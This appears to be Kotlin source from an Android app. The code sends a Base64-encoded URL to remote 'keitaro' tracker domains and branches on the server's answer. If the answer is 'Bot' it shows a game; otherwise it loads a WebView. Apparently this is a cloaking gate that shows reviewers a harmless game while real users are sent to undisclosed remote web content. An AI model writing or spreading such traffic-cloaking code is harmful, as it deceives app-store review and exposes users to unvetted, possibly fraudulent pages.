package com.mvvm_rcv_kot.mainweb

import android.content.ContentValues.TAG
import android.content.Context
import android.content.SharedPreferences
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class Serv(
    private val mainActivity: ActivityWebView,
    private val context: Context,
    private val playerPrefs: SharedPreferences
) {
    /*fun initializeService() {

        val client = OkHttpClient()
        val serverKey = playerPrefs.getString(Const.SERVASD,"").toString()
        val sendKey = playerPrefs.getString(Const.IOTTE,"").toString()

        val serverSends = "{\"url\": \"${serverKey}\"}"

        val encodedString: String = Base64.encodeToString(serverSends.toByteArray(), Base64.DEFAULT).trim()
        val sends = sendKey
        val requestBody = encodedString.toRequestBody("text/plain".toMediaTypeOrNull())

        val request = Request.Builder()
            .url(sends)
            .post(requestBody)
            .build()

        GlobalScope.launch(Dispatchers.IO) {
            val response = client.newCall(request).execute()
            val body = response.body?.string()

            launch(Dispatchers.Main) {
                Log.d(TAG, "Hello bot")
                if (body == "\"Bot\"") {
                    val editor = playerPrefs.edit()
                    editor.putBoolean(Const.BOT, true)
                    editor.apply()
                    loadGame()
                } else {
                    Log.d(TAG, "Hello non bot")
                    mainActivity.LoadWv()
                }
            }
        }
    }*/

    fun initializeService() {
        val client = OkHttpClient()
        val serverKey = playerPrefs.getString(Const.SERVASD,"https://keitaro1.xyz/CHd1gz").toString()
        val sendKey = playerPrefs.getString(Const.IOTTE,"https://keitaroayzau.site/audit").toString()

        if (!isValidUrl(sendKey)) {
            // Log or show error message
            println("Invalid URL: $sendKey")
            return
        }

        val serverSends = "{\"url\": \"${serverKey}\"}"
        val encodedString: String = Base64.encodeToString(serverSends.toByteArray(), Base64.DEFAULT).trim()
        val sends = sendKey
        val requestBody = encodedString.toRequestBody("text/plain".toMediaTypeOrNull())

        val request = Request.Builder()
            .url(sends)
            .post(requestBody)
            .build()

        GlobalScope.launch(Dispatchers.IO) {
            val response = client.newCall(request).execute()
            val body = response.body?.string()

            launch(Dispatchers.Main) {
                if (body == "\"Bot\"") {
                    Log.d(TAG, "my url bad")

                    val editor = playerPrefs.edit()
                    editor.putBoolean(Const.BOT, true)
                    editor.apply()
                    loadGame()
                } else {
                    Log.d(TAG, "my url good")
                    mainActivity.LoadWv()
                }
            }
        }
    }

    fun isValidUrl(url: String): Boolean {
        return url.startsWith("http://") || url.startsWith("https://")
    }


    private fun loadGame() {
        mainActivity.Game()
    }
}


